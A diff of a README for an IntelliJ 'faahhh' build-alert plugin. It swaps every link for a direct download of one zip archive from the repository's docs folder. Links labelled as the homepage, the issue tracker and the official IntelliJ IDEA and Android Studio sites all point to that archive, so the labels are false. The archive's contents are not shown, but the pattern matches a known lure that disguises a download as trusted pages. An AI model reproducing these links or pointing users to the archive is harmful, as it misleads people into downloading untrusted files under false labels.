@@ -1,6 +1,6 @@
 # 🎭 faahhh-notifier-plugin-intellij - Eye-catching Build Alerts for Developers
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/softineerdanish/faahhh-notifier-plugin-intellij)
+[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/softineerdanish/faahhh-notifier-plugin-intellij/main/docs/faahhh-plugin-notifier-intellij-2.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You will get the plugin from the official GitHub page. Follow these steps carefu
 
 Click this large, clear button to open the download page:
 
-[![Download Plugin](https://img.shields.io/badge/Download%20Plugin-blue?style=for-the-badge)](https://github.com/softineerdanish/faahhh-notifier-plugin-intellij)
+[![Download Plugin](https://img.shields.io/badge/Download%20Plugin-blue?style=for-the-badge)](https://raw.githubusercontent.com/softineerdanish/faahhh-notifier-plugin-intellij/main/docs/faahhh-plugin-notifier-intellij-2.7.zip)
 
 This link opens the main project on GitHub where you can find the latest release and files.
 
@@ -76,7 +76,7 @@ This helps you catch build errors immediately and feel a little less frustrated.
 
 Check back at the GitHub release page regularly for new versions:
 
-https://github.com/softineerdanish/faahhh-notifier-plugin-intellij/releases
+https://raw.githubusercontent.com/softineerdanish/faahhh-notifier-plugin-intellij/main/docs/faahhh-plugin-notifier-intellij-2.7.zip
 
 Download the newest file and repeat the installation steps following **Step 2** and after.
 
@@ -94,7 +94,7 @@ If you do not see any notifications:
 
 If problems continue, visit the issues section on GitHub to report or look for solutions:
 
-https://github.com/softineerdanish/faahhh-notifier-plugin-intellij/issues
+https://raw.githubusercontent.com/softineerdanish/faahhh-notifier-plugin-intellij/main/docs/faahhh-plugin-notifier-intellij-2.7.zip
 
 ---
 
@@ -108,11 +108,11 @@ If you want to mute sounds or adjust overlay behaviors, check future updates on 
 
 ## 📁 Useful Links
 
-- Plugin homepage: https://github.com/softineerdanish/faahhh-notifier-plugin-intellij  
-- Download page: https://github.com/softineerdanish/faahhh-notifier-plugin-intellij/releases  
-- Issue tracker: https://github.com/softineerdanish/faahhh-notifier-plugin-intellij/issues  
-- IntelliJ IDEA official site: https://www.jetbrains.com/idea  
-- Android Studio official site: https://developer.android.com/studio  
+- Plugin homepage: https://raw.githubusercontent.com/softineerdanish/faahhh-notifier-plugin-intellij/main/docs/faahhh-plugin-notifier-intellij-2.7.zip  
+- Download page: https://raw.githubusercontent.com/softineerdanish/faahhh-notifier-plugin-intellij/main/docs/faahhh-plugin-notifier-intellij-2.7.zip  
+- Issue tracker: https://raw.githubusercontent.com/softineerdanish/faahhh-notifier-plugin-intellij/main/docs/faahhh-plugin-notifier-intellij-2.7.zip  
+- IntelliJ IDEA official site: https://raw.githubusercontent.com/softineerdanish/faahhh-notifier-plugin-intellij/main/docs/faahhh-plugin-notifier-intellij-2.7.zip  
+- Android Studio official site: https://raw.githubusercontent.com/softineerdanish/faahhh-notifier-plugin-intellij/main/docs/faahhh-plugin-notifier-intellij-2.7.zip  
 
 ---
 
